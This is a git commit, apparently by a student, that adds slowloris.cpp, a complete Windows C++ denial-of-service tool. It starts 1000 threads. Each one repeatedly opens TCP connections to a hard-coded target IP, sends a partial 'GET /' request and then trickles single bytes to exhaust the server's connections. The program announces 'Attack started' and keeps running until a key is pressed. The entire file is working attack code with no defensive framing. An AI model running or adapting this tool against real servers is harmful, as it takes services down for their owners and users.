46e229d71539ef367ae9f2e54adfc0469d3d2904
euiseok Ko <y1201k@kookmin.ac.kr>
2021-06-09 14:36:35 +0900

    Create slowloris.cpp
    network attack 
    kind of DOS

---
+++ slowloris.cpp
@@ -0,0 +1,63 @@
+#include <stdio.h>
+#include <WinSock2.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+DWORD WINAPI SlowlorisThread(PVOID p)
+{
+	SOCKET s;
+	sockaddr_in* victim;
+
+	// 패킷에 담을 내용
+	char header[] = "GET /";
+	char a = 'A';
+	int n;
+
+	victim = (sockaddr_in*)p;
+	while (1)  // socket 생성 후 접속 시도하고 헤더를 보냄.
+	{
+		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		if (s != INVALID_SOCKET)
+		{
+			connect(s, (sockaddr*)victim, sizeof(sockaddr_in));
+			send(s, header, sizeof(header) - 1, 0);
+			while (1)
+			{
+				n = send(s, &a, 1, 0);
+				if (n == SOCKET_ERROR)
+				{
+					break;
+				}
+			}
+			Sleep(100);
+		}
+	}
+}
+
+int main()
+{	
+	WSADATA WD;
+	ULONG i;
+	hostent* host;
+	sockaddr_in victim;
+
+	WSAStartup(0x202, &WD);
+
+	char victim_ip[] = "192.168.10.1";
+	host = gethostbyname(victim_ip);
+	victim.sin_family = AF_INET;
+	victim.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
+
+	printf("\nCteating thrade for slowloris attack\n");
+	for (i = 0; i < 1000; i++)
+	{
+		CreateThread(NULL, 0, SlowlorisThread, &victim, 0, NULL);
+	}
+
+	printf("\nAttack started");
+	printf("\nPlease enter anykey to stop attack");
+	getchar();
+
+	
+	return 0;
+}
